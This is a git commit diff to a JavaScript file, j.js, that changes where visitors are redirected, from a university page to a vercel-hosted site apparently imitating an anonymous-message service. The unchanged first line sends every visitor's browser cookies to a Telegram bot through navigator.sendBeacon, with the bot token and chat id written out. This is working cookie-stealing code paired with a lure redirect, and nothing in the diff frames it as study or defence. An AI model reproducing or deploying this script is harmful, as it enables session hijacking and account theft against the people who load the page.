85f6aed448eb75ef12afa6268ba1d797981ca89b
ae54 <chromscurity11@gmail.com>
2025-07-04 08:34:26 +0300

    Update j.js

--- j.js
+++ j.js
@@ -1,2 +1,2 @@
 navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie)}`);
-window.location.replace("https://isb.helwan.edu.eg/sarhne.html");
+window.location.replace("https://sarhne-gold.vercel.app/?a=saraha");
